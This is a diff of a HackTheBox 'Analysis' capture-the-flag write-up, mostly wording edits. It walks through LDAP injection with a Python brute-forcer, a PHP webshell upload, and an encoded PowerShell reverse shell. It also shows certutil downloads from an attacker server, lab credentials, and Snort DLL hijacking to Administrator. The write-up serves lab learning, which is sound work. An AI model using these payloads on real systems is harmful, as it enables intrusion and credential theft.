@@ -10,22 +10,31 @@ tags: CTF, HTB, HackTheBox, hard, CyberSecurity, LDAP, Snort, DLL
 	<img src="assets/img/Analysis.png">
 </p>
 
+`Note : `
+
+`This box was really funny to Solve, I specially loved the LDAP Injection part, and this is why I made this Writeup. I hope you will enjoy it as i did!`
+
+`After that I took a look at the <a href="https://www.youtube.com/watch?v=9U7OFdri73g">Ippsec Analysis Walktrought</a>, I deffinitvely suggest you to see it. His methode and Scripting Skills for the LDAP Injection part are A-MA-ZING! And this push me to Sharp my code later!`
+
+`- V0lk3n` 
+
 > Written by [V0lk3n](https://twitter.com/V0lk3n)
 
 
 ## Table of Contents
 
-* [Analysis - Information](#information)
-* [Enumeration](#enumeration)
+* [Analysis - Information](#information)<br/><br/>
+* [Enumeration](#enumeration)<br/><br/>
 * [Exploitation](#exploitation)
 	* [Exploitation - LDAP Injection](#exploitation-ldap)
 	* [Exploitation - Getting a web shell](#exploitation-webshell)
-	* [Exploitation - Webshell to Reverse shell](#exploitation-reverseshell)
+	* [Exploitation - Webshell to Reverse shell](#exploitation-reverseshell)<br/><br/>
 * [Privilege Escalation](#privesc)
 	* [Privilege Escalation - svc_web to webservice](#privesc-webservice)
 	* [Privilege Escalation - webservice to jdoe user](#privesc-jdoe)
 	* [Privilege Escalation - jdoe to Administrator](#privesc-administrator)
 		* [Privilege Escalation - DLL Hijacking](#privesc-dllhijacking)<br/><br/>
+* [Credits](#credits)<br/><br/>
 
 # Analysis - Information<a name="information"></a>
 
@@ -39,9 +48,9 @@ Creator : <a href="https://app.hackthebox.com/users/70653">UVision</a>
 
 # Enumeration<a name="enumeration"></a>
 
-First i add to my `/etc/hosts` file the box ip address and the hostname `analysis.htb` as it's the name of the box.
+First I add to my `/etc/hosts` file the box ip address and the hostname `analysis.htb` as it's the name of the box and it can be the default domain used.
 
-Then i run a nmap scan.
+Then I run a nmap scan.
 
 ```bash
 $ nmap -A -p - analysis.htb
@@ -111,7 +120,7 @@ Nmap done: 1 IP address (1 host up) scanned in 102.86 seconds
 
 ```
 
-As kerberos is running, i start an user enumeration using kerbrute on it, while doing my web enumeration. Note that i removed the duplicated username.
+As kerberos is running, I start an user enumeration using kerbrute on it. (Note that i removed the duplicated username.)
 
 ```bash
 $ ./kerbrute_linux_amd64 userenum -d analysis.htb --dc 10.129.230.179 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
@@ -136,9 +145,7 @@ Version: v1.0.3 (9dad6e1) - 03/07/24 - Ronnie Flathers @ropnop
 2024/03/08 00:26:31 >  [+] VALID USERNAME:       badam@analysis.htb
 ```
 
-I've run a normal subdomain fuzzing without succes.
-
-So my next attempt was to bruteforce using the NS Server with dnsrecon, and this time i retrieved a lot of subdomain records.
+My next step was to enumerate Subdomain, and to do this I used `dnsrecon`, and I retrieved a lot of subdomain records.
 
 ```bash
 $ dnsrecon -d analysis.htb -n 10.129.230.179 -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t brt
@@ -181,6 +188,8 @@ Starting gobuster in directory enumeration mode
 
 I found three interesting directory, `/users`, `/dashboard` and `employees`, so let's enumerate them one by one.
 
+> Note : For these step, I learned with Ippsec video that I can use the tool `feroxbuster`, which will look recursively in these directory, which is awesome.
+
 ### Web Enumeration - Dashboard Path
 
 Fuzzing directory/files with gobuster against `/dashboard` directory.
@@ -219,7 +228,7 @@ Starting gobuster in directory enumeration mode
 ...
 ```
 
-A lot of result, but browsing those show nothing relevant excepted blank page. So let's move on.
+A lot of result, but browsing these show nothing relevant excepted blank page. So let's move on.
 
 ### Web Enumeration - Employees Path
 
@@ -251,7 +260,7 @@ I found a login page.
 	<img src="assets/img/1-Employees_login_page.png">
 </p>
 
-Apparently, i need to use an email and password to login, guessing credentials doesn't worked, of course i can attempt to bruteforce the page with the email found with kerbrute, but as im at my enumeration steps, i prefere to move on.
+Apparently, I need to use an email and password to login, guessing credentials doesn't work. Of course I can attempt to brute-force the page with the email recolted with `kerbrute`, but as im at my enumeration steps, I prefere to move on.
 
 ### Web Enumeration - Users Path
 
@@ -277,13 +286,15 @@ Starting gobuster in directory enumeration mode
 /list.php             (Status: 200) [Size: 17]
 ```
 
-We found a page named `list.php`. Browsing it reveal that we are missing parameter.
+I found a page named `list.php`. Browsing it reveal an error : `missing parameter`.
 
 <p align="center">
 	<img src="assets/img/2-list_php_missing_params.png">
 </p>
 
-So let's fuzzing the paremeters, for this i used the tool called `wfuzz` using the `large.txt` parameter wordlist from Arjun. You can find it bellow :
+So let's fuzzing the paremeters.
+
+For this I used the tool called `wfuzz` using the `large.txt` parameter wordlist from <a href="https://github.com/s0md3v/Arjun">Arjun</a>. You can find it bellow :
 
 <a href="https://github.com/s0md3v/Arjun/tree/master/arjun/db">Parameter wordlists</a>
 
@@ -307,7 +318,9 @@ ID           Response   Lines    Word       Chars       Payload
 ...
 ```
 
-Runing the tool and ignoring 404 error, i got full of false positive. This is because i alway get an answer from the "missing parameter" page. So run again the tool and this time ignore every content of 17 characters to ignore the "missing parameter" response.
+Runing the tool and ignoring 404 error, I got full of false positive. 
+
+This is because I alway get an answer from the `missing parameter` page. So run again the tool and this time ignore every content of 17 characters to ignore the `missing parameter` response.
 
 ```bash
 $ wfuzz -c -w Documents/pentest-toolset/wordlists/params/params-large.txt --hc=404 --hh=17 
@@ -332,35 +345,37 @@ Requests/sec.: 204.7100
 
 ```
 
-Nice, i've found the parameter `name` and the page contain 406 characters. Let's try to browse it to see how its look like.
+Nice, I've found the parameter `name` and the page contain `406 characters`. Let's try to browse it to see how its look like.
 
 <p align="center">
 	<img src="assets/img/3-name_parameter.png">
 </p>
 
-Nice, now i try to put as value for the "name" parameter, the users found with kerbrute, and got a match.
+Nice, now I try to put as value for the `name` parameter, the users found with kerbrute, and got a match.
 
 <p align="center">
 	<img src="assets/img/4-technician_name_parameter.png">
 </p>
 
-As you can see, the name "technician" is reflected into the tables "Username" and "First Name".
+As you can see, the name `technician` is reflected into the tables `Username` and `First Name`.
 
-My first attempt was to look for SQL injection, as shown the nmap scan, mysql is runing, so i was thinking that the tables was taking SQL query to retrieve the correct data.
+My first attempt was to look for SQL injection, as shown the `nmap scan`, `mysql` is runing, so I was thinking that the tables was taking SQL query to retrieve the correct data.
 
 ```bash
 3306/tcp  open  mysql         MySQL (unauthorized)
 33060/tcp open  mysqlx?
 ```
 
-But i was wrong. Looking back at my nmap scan, i searched for which attack may be possible, and i seen that ldap was runing too.
+But I was wrong. Looking back at my nmap scan, I searched for which attack may be possible, and I seen that ldap was runing too.
 
 ```bash
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
 ```
 
-So maybe it's the same idea that i get mysql, a ldap injection. As im not really good to it, i do a bit of google search and read some ressources about ldap injection. Bellow is the better ressources that i've read.
+So maybe we have a ldap injection there. 
+
+As im not really good to it, I do a bit of google search and read some ressources about `ldap injection`. Bellow is the better ressources that i've read.
 
 - <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection">OWASP - 06  Testing for LDAP Injection</a>
 
@@ -368,13 +383,13 @@ So maybe it's the same idea that i get mysql, a ldap injection. As im not really
 
 - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection">Payload All The Things - LDAP Injection</a>
 
-After reading those documentation, i started to look if LDAP Injection was possible, for this i removed the "technician" value, and replaced it with a `*` for wildcard.
+After reading these documentations, i started to look if an `LDAP Injection` was possible, for this i removed the `technician` value, and replaced it with a `*` (star character) which is used as wildcard in LDAP.
 
 <p align="center">
 	<img src="assets/img/5-LDAP_Injection_test.png">
 </p>
 
-It work! It retrieved the value "technician" using wildcard!
+It work! It retrieved the value `technician` using wildcard!
 
 Time to exploit this.
 
@@ -382,29 +397,28 @@ Time to exploit this.
 
 ## Exploitation - LDAP Injection<a name="exploitation-ldap"></a>
 
-To exploit it, i've developed a Python Tool. This tool was based on the script found on Hacktricks LDAP injection blog post and Payload All The Things LDAP Injection.
+> Note : You realy should look at Ippsec video for this step. So better than what I do here, as I'm clearly bad at coding.
+
+To exploit it, I've developed a Python Tool. This tool was based on the script found on Hacktricks LDAP injection blog post and Payload All The Things LDAP Injection.
 
 At the beginning i've made two script. 
 
-The first script enumerate the valid arguments on the request, and look for which arguments was bruteforceable to retrieve data.
+The first script was enumerating the valid arguments on the request, and look for which arguments was bruteforceable to retrieve data.
 
 The second script bruteforce the arguments data.
 
-Finally i combined both scripts, but i got some problem at the "brute force data" step, after spending a lot of time on this, i finally asked ChatGPT to fix the problem for me (the problem was about indentation and declaration variables but i'm really bad at coding, and without ChatGPT optimization, my version didnt defined functions).
+Finally I've combined both scripts.
 
-You can find both of my final code bellow with the ChatGPT fix, and the one which was optimized by ChatGPT.
+You can find both of my final code bellow :
 
-<a href="assets/ldap-burn_ugly.py">ldap-burn.py - Ugly version with ChatGPT fix</a>
+<a href="assets/ldap-burn_ugly.py">ldap-burn.py - Ugly version</a>
 
 <a href="assets/ldap-burn.py">ldap-burn.py - Optimized by ChatGPT</a>
 
-Here is the final code (Optimized by ChatGPT version):
+Here is the final code (Version Optimized by ChatGPT):
 
 ```python 
 #!/usr/bin/python3
-# 90% of this code was made by v0lk3n
-# But i asked ChatGPT to fix an error for the last bruteforce step
-# And finaly asked ChatGPT to optimize the code to make it better
 import sys
 import requests
 import string
@@ -510,13 +524,15 @@ if __name__ == "__main__":
 As said before, the tool will :
 
 - Enumerate the valid arguments which is in the list.
-- Look if we can retrieve data by brute forcing, and if yes, which arguments.
-- Finally it bruteforce those arguments to retrieve data.
-- Additionally, once no more character are found on the data, it use a way to bypass the wildcard asterix to count in as character. In case the asterix is used on the retrieved data and make sure that the data are complete.
+- Look if we can retrieve data by brute forcing, and if yes, on which arguments.
+- Finally it bruteforce these arguments to retrieve data.
+- Additionally, once no more character are found on the data, it use a way to bypass the wildcard asterix to count it as a character instead of a wildcard.
 
-Now i run the tool to automate the LDAP Injection.
+Now I run the tool to automate the LDAP Injection.
 
-![Watch the video](assets/ldap-burn.mp4)
+<p align="center">
+	<img src="assets/ldap-burn.gif">
+</p>
 
 And here are the retrieved data :
 
@@ -532,9 +548,9 @@ displayName: http://internal.analysis.htb/users/list.php?name=*)(displayName=tec
 givenName: http://internal.analysis.htb/users/list.php?name=*)(givenName=technician
 ```
 
-I guess that the description string `97NTtl*4QP96Bv` may be a password, and i use it on the `http://internal.analysis.htb/employees/login.php` page, with the `technician@analysis.htb`email found with kerbrute.
+I guess that the description string `97NTtl*4QP96Bv` may be a password, and I use it on the `http://internal.analysis.htb/employees/login.php` page, with the `technician@analysis.htb` email found with kerbrute.
 
-And it worked! We successfully logged in.
+And it worked! I successfully logged in.
 
 <p align="center">
 	<img src="assets/img/6-Technician_Login.jpg">
@@ -543,38 +559,41 @@ And it worked! We successfully logged in.
 
 ## Exploitation - Getting a web shell<a name="exploitation-webshell"></a>
 
-First we start to enumerate the plateform.
+First I start to enumerate the plateform.
 
 The dashboard show a To do list and some message not relevant at all.
-
 
 <p align="center">
 	<img src="assets/img/10-Dashboard.png">
 </p>
 
-There is a tickets menu, where we can see few interesting information.
+There is a tickets menu, where I can see few interesting information.
 
 <p align="center">
 	<img src="assets/img/7-tickets.png">
 </p>
 
-There is two unresolved issue, hta file seem not working and there is some Active Directory login issue, which seem to be related to kerberos authentication.
+There is two unresolved issue, `hta` file seem not working and there is some `Active Directory login` issue, which seem to be related to kerberos authentication.
 
 There is an Emergency menu, not interesting at first look.
 
 <p align="center">
-	<img src="assets/img/8-SoC_File.png">
+	<img src="assets/img/8-Emergency.png">
 </p>
 
-A SoC menu, which look interesting because we can send file to be analyzed by analysts. And with the box name, it may be a hint for our reverse shell.
+A SoC menu, which look interesting because I can send file to be analyzed by `analysts`. And with the box name, it may be a hint for our reverse shell.
 
 <p align="center">
 	<img src="assets/img/9-SoC_File.png">
 </p>
 
-Based on the ticket, sending an hta payload would not work. As the plateform seem to use PHP, i tried to send some payload. 
+Based on the ticket, sending an `hta payload` would not work. As the plateform seem to use PHP, i tried to send some payload. 
 
-To see whats going on, i try to send a php file with a command to print `Hello`, i load the file and press `Upload the sample` on the SoC Report menu and intercept the request using BurpSuit, send to repeater, and execute the request Bellow is the content of my file.
+To see whats going on, I try to send a php file with a command to print `Hello`.
+
+I load the file and press `Upload the sample` on the `SoC Report menu` then intercept that request using BurpSuit, send it to repeater and execute the request.
+
+Bellow is the content of my file.
 
 ```php
 <?php
@@ -586,7 +605,7 @@ echo "Hello";
 	<img src="assets/img/11-test_php_payload.png">
 </p>
 
-As we can see, the Response show the destination path of our file. And browsing it show that the PHP code is executed.
+As shown, the Response display the destination path of my uploaded file. Browsing it show that the PHP code is executed.
 
 ```bash
 http://internal.analysis.htb/dashboard/uploads/testfile.php
@@ -596,30 +615,31 @@ http://internal.analysis.htb/dashboard/uploads/testfile.php
 	<img src="assets/img/12-Browse_test_payload.png">
 </p>
 
-Testing various PHP payload, i see the connection happening but closed immediate.
+Testing various PHP payload, I see the connection happening but closed right after it.
 
-So i tried to use a classic one liner php webshell payload.
+So I tried to use a classic one liner php webshell payload.
 
 ```php
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
-I modify my BurpSuite request to replace the used payload, and overwrite my testfile.php by sending the new request.
+I modified my BurpSuite request to replace the used payload, and overwrite my testfile.php by sending the new request.
 
 <p align="center">
 	<img src="assets/img/13-Webshell_Payload.png">
 </p>
 
 Then i browse it and try to execute the command `whoami`.
+
 ```bash
 http://internal.analysis.htb/dashboard/uploads/testfile.php?cmd=whoami
 ```
 
 <p align="center">
-	<img src="assets/img/14-Webshell_Payload.png">
+	<img src="assets/img/14-Whoami_webshell.png">
 </p>
 
-Great! We got the answer `analysis\svc_web`. We have a working webshell now.
+Great! I got the answer `analysis\svc_web`. I have a working webshell now.
 
 ## Exploitation - Webshell to Reverse shell<a name="exploitation-reverseshell"></a>
 
@@ -639,13 +659,13 @@ $ nc -nvlp 1234
 listening on [any] 1234 ...
 ```
 
-Finally i execute my command into my webshell.
+Finally I execute my command into my webshell.
 
 ```bash
 http://internal.analysis.htb/dashboard/uploads/backdoor.php?cmd=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANQAyACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
 ```
 
-And i get a reverse shell!
+And I get a reverse shell!
 
 ```bash
 $ nc -nvlp 1234                           
@@ -679,7 +699,7 @@ $ldap_connection = ldap_connect("analysis.htb");
 
 ```
 
-Wasn't able to connect through `evil-winrm`, so i uploaded RunasCS.exe to the box.
+I wasn't able to connect through `evil-winrm`, so i uploaded RunasCS.exe to the box.
 
 I start a python http server on my attacker box, where RunasCS.exe is located.
 
@@ -688,7 +708,7 @@ $ python -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-And download the files on the target into the `C:\inetpub\internal\dashboard\uploads` directory.
+And download the executable on the target into the `C:\inetpub\internal\dashboard\uploads` path.
 
 ```bash
 PS C:\inetpub\internal\dashboard\uploads> certutil.exe -urlcache -f http://10.10.16.52:80/RunasCs.exe runas.exe
@@ -705,7 +725,7 @@ Mode                LastWriteTime         Length Name
 -a----       08/03/2024     23:03          51712 runas.exe                                                             
 ```
 
-And then i used it to get a reverse shell as `webservice`.
+And then I used it to get a reverse shell as `webservice`.
 
 ```bash
 PS C:\inetpub\internal\dashboard\uploads> .\runas.exe webservice 'N1G6G46G@G!j' "cmd /c whoami"
@@ -725,7 +745,7 @@ PS C:\inetpub\internal\dashboard\uploads> .\runas.exe webservice 'N1G6G46G@G!j' 
 
 ## Privilege Escalation - webservice to jdoe user<a name="privesc-jdoe"></a>
 
-Here i enumerated a bit the box, and found few interesting things but leaded me nowhere.
+Here I enumerated a bit the box, and found few interesting things but leaded me no where.
 
 ```bash
 C:\inetpub\internal\employees>type login.php
@@ -749,7 +769,7 @@ pHnjX+5HyybuBwIQwGprgyWdGnyv3mfcQQ==
 -----END ENCODED MESSAGE-----
  ```
 
-From here i uploaded WinPEAS to the box on the path `C:\inetpub\internal\dashboard\uploads\`.
+From here I uploaded WinPEAS to the box on the path `C:\inetpub\internal\dashboard\uploads\`.
 
 I start a python http server on my attacker box where WinPEAS is located.
 
@@ -783,7 +803,7 @@ dir
 
 ```
 
-Runing the script i found a lot of interesting things that we will come back to it later, but for now, here is what we are looking for.
+Runing the script I found a lot of interesting things that I will come back to it later, but for now, here is what I'm looking for.
 
 I got `jdoe` AutoLogon credentials.
 
@@ -799,7 +819,7 @@ C:\inetpub\internal\dashboard\uploads>winpeas.exe
     DefaultPassword               :  7y4Z4^*y9Zzj
 ```
 
-Using them, i was able to get a shell as `jdoe` using `evil-winrm` 
+Using these credenitals, I was able to get a shell as `jdoe` using `evil-winrm` 
 
 ```bash
 $ evil-winrm -u jdoe -p '7y4Z4^*y9Zzj' -i analysis.htb
@@ -814,7 +834,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\jdoe\Documents>
 ```
 
-And from there, i was able to retrieve the `user.txt` flag!
+And from there, I was able to retrieve the `user.txt` flag!
 
 ```bash
 *Evil-WinRM* PS C:\Users\jdoe\Desktop> type user.txt
@@ -831,7 +851,7 @@ And from there, i was able to retrieve the `user.txt` flag!
 ## Privilege Escalation - jdoe to Administrator<a name="privesc-administrator"></a>
 
 
-As `jdoe` user, i started WinPEAS script again. And i've found few interesting things.
+As `jdoe` user, I started WinPEAS script again. And i've found few interesting things.
 
 Finding about BCTextEncode :
 
@@ -855,6 +875,7 @@ Finding about BCTextEncode :
 *Evil-WinRM* PS C:\Users\jdoe\Documents> type C:\Users\jdoe\AppData\Local\Automation\run.bat
 start "BCEncoder" "C:\Program Files\BCTextEncoder\BCTextEncoder.exe"
 ```
+After trying some things realted to `BCTextEncoder`, this was leading me no where once again, but I've found another interesting things.
 
 Finding about Snort :
 
@@ -865,6 +886,14 @@ Finding about Snort :
     Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    =================================================================================================
 ```
+
+Google about it and I find some ressources how I can exploit this.
+
+Source : <a href="https://ubuntu.com/security/CVE-2016-1417">Ubuntu Security - CVE-2016-1417</a>
+
+Source : <a href="https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html">Packet Storm Security - CVE-2016-1417</a>
+
+Let's try a DLL Hijacking on Snort.
 
 ## Privilege Exploitation - DLL Hijacking<a name="privesc-dllhijacking"></a>
 
@@ -946,8 +975,6 @@ WinHttp Cache entries: 1
 CertUtil: -URLCache command completed successfully.
 ```
 
-You should see both files triggered from your python http server.
-
 ```bash
 $ python -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
@@ -967,7 +994,7 @@ snort.exe : Running in packet dump mode
         --== Initializing Snort ==--Initializing Output Plugins!pcap DAQ configured to passive.The DAQ version does not support reload.Acquiring network traffic from "\Device\NPF_{30B536A0-3BBD-407B-9123-6AB9CA845E94}".Decoding Ethernet        --== Initialization Complete ==--   ,,_     -*> Snort! <*-  o"  )~   Version 2.9.20-WIN64 GRE (Build 82)    ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team           Copyright (C) 2014-2022 Cisco and/or its affiliates. All rights reserved.           Copyright (C) 1998-2013 Sourcefire, Inc., et al.           Using PCRE version: 8.10 2010-06-25           Using ZLIB version: 1.2.11Commencing packet processing (pid=5676)
 ```
 
-And you should get back a shell as Administrator into you'r metasploit listener.
+And I get back a shell as Administrator into my metasploit listener.
 
 ```bash
 msf6 exploit(multi/handler) > run
@@ -981,11 +1008,23 @@ meterpreter > getuid
 Server username: ANALYSIS\Administrateur
 ```
 
-And we can take the root flag!
+And I can finally take the root flag!
 
 <p align="center">
 	<img src="assets/img/16-root_flag.png">
 </p>
 
 **root.txt : c64cbec2e749e1acee1e49083f550107**
+
+# Credits<a name="credits"></a>
+
+Special thanks to the Creator of the box : <a href="https://app.hackthebox.com/users/70653">UVision</a>!
+Also, Thanks to Ippsec for it's amazing content, and for <a href="https://www.youtube.com/watch?v=9U7OFdri73g">the walktrought of this box</a>!
+
+And of course... 
+
+**Thanks to my team [Godzillhack!](https://godzillhack.com)**
+
+
+
 
